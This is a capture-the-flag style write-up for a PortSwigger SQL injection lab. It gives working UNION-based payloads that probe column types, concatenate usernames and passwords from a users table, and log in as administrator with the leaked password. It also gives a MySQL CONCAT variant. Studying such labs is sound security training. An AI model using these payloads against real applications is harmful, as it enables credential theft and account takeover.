# Lab 06 — SQL injection UNION attack, retrieving multiple values in a single column

> **Practitioner** · [Official lab](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column)

**Entry point:** `GET /filter?category=`

## Goal

Extract usernames **and** passwords when only one of the returned columns
accepts text, by concatenating values into that column.

## Solution

1. The query returns **2 columns**; probing shows only the **second** is text:

```
'+UNION+SELECT+NULL,'a'--     ← OK
'+UNION+SELECT+'a',NULL--     ← error
```

2. Concatenate `username` and `password` into one value with `||`
   (Oracle / PostgreSQL syntax, the DB used here):

```
'+UNION+SELECT+NULL,username||'~'||password+FROM+users--
```

3. The response contains rows like:

```
administrator~p1mp3rn1c10us
wiener~abc123
...
```

4. Log in as `administrator` with the leaked password — lab solved.

## Notes

- Use any delimiter that cannot appear in the data (`~`, `:`, `|`).
- On MySQL the concatenation operator is `CONCAT(username, ':', password)`
  (or `GROUP_CONCAT`), since `||` is a logical OR unless `PIPES_AS_CONCAT`
  is enabled.
